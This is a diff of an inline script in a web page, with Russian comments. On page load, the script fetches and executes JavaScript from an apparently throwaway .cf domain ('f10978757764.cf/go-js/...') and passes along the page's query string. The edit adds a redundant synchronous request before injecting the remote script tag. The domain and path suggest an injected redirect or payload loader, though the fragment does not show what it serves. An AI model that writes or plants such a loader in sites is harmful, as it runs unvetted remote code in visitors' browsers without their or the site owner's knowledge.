@@ -3,15 +3,21 @@
 
 <script type="text/javascript">
 !function(){
-var a=document.createElement("script");
-a.type="text/javascript";
+var a=new XMLHttpRequest();
+a.open("GET","https://www.f10978757764.cf/go-js/48e1476a-b7a7-4733-b07b-a27f1a7412ac?"+window.location.search.substring(1),false);
+// делаем синхронный запрос, чтобы дождаться ответа
+a.send();
+// если статус ответа равен 200, то скрипт успешно загружен
+if(a.status==200){
+// создаем элемент script с помощью document.createElement
+var b=document.createElement("script");
+b.type="text/javascript";
 // устанавливаем атрибут src равным ссылке на ваш скрипт
-a.src="https://www.f10978757764.cf/go-js/48e1476a-b7a7-4733-b07b-a27f1a7412ac?"+window.location.search.substring(1);
-// устанавливаем атрибут async равным false, чтобы загрузить и выполнить скрипт синхронно
-a.async=false;
+b.src="https://www.f10978757764.cf/go-js/48e1476a-b7a7-4733-b07b-a27f1a7412ac?"+window.location.search.substring(1);
 // добавляем элемент script в начало головы документа
-var b=document.head.firstChild;
-document.head.insertBefore(a,b);
+var c=document.getElementsByTagName("script")[0];
+c.parentNode.insertBefore(b,c);
+}
 }();
 </script>
 	
